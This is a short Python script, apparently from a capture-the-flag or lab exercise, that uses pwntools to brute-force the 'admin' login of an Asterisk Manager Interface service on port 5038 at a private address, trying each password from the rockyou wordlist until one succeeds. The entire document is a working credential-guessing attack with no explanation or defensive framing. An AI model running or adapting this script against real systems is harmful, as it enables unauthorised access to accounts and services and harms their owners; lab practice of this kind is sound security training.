from pwn import remote

ip = '10.10.134.236'
port = 5038

def try_login(username, password):
    print(f"Trying {username}:{password}")
    conn = remote(ip, port, level='error')
    welcome_msg = conn.recvline(timeout=0.5)
    msg = f"ACTION: LOGIN\nUSERNAME: {username}\nSECRET: {password}\nEVENTS: ON\n\n"
    print(msg)
    conn.send(msg)
    resp = conn.recvline(timeout=2)
    filler = conn.recvline(timeout=2)
    filler = conn.recvline(timeout=2)
    return 'Success' in resp.decode()

with open('/usr/share/wordlists/rockyou_no_unicode.txt', 'r') as f:
    all_passwords = f.readlines()


for p in all_passwords:
    if try_login('admin', p.strip()):
        print(f"FOUND VALID LOGIN ")
        print(f"admin:{p}")
        break

print("All done")